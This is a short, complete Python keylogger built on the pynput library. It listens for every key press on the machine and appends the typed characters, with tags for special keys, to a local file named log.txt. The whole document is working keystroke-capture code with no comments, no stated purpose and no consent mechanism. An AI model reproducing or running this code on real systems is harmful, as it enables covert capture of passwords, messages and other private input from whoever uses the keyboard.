from pynput import keyboard

ignorar = {
    keyboard.Key.shift, 
    keyboard.Key.shift_r, 
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r, 
    keyboard.Key.alt_l, 
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.tab,
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as log_file:
            log_file.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as log_file:    
            if key in ignorar:
                pass
            elif key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                log_file.write("[ESC]")
            else:
                log_file.write(f"[{key.name.upper()}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()